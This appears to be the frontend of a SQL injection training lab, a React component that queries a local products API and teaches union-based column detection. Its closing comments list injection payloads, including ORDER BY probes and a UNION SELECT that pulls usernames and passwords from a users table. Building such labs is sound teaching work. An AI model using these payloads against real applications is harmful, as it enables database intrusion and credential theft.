import React, { useState } from 'react';
import './lab2.css';

function Lab2() {
  const [input, setInput] = useState('');
  const [results, setResults] = useState([]);
  const [error, setError] = useState('');
  const [message, setMessage] = useState('');

  const fetchData = async () => {
    try {
      const res = await fetch(`http://localhost:5000/api/products?id=${encodeURIComponent(input)}`);
      const data = await res.json();

      if (data.error) {
        setError(data.error);
        setResults([]);
      } else {
        setResults(data);
        setError('');
      }
    } catch (err) {
      console.error('Fetch error:', err);
      setError('Something went wrong with the fetch request.');
      setResults([]);
    }
  };

  const handleColumnTest = () => {
    setMessage("Try different ORDER BY numbers like ORDER BY 1, ORDER BY 2, and so on to determine the number of columns.");
    setError('');
  };

  return (
    <div className="sqllab2-wrapper">
      <div className="sqllab2-container">
        <h1>Determine Column with Union-Based Injection</h1>
        <p>Use the ORDER BY clause to determine the number of columns in the database.</p>
        <button onClick={handleColumnTest}>Show Column Detection Instructions</button>
        <input
          type="text"
          placeholder="Enter product ID"
          value={input}
          onChange={(e) => setInput(e.target.value)}
        />
        <button onClick={fetchData}>Search</button>

        {message && <p className="sqllab2-message">{message}</p>}
        {error && <p className="sqllab2-error">{error}</p>}

        <div className="sqllab2-results">
          <h3>Results:</h3>
          {results.map((item, index) => (
            <p key={index}>{item.name} - {item.price || item.secret}</p>
          ))}
        </div>
      </div>
    </div>
  );
}

export default Lab2;


// 1 ORDER BY 1--
// 1 ORDER BY 2--
// 1 ORDER BY 3--


// -1 UNION SELECT 'test1', 'test2'--
// -1 UNION SELECT username, password FROM users--
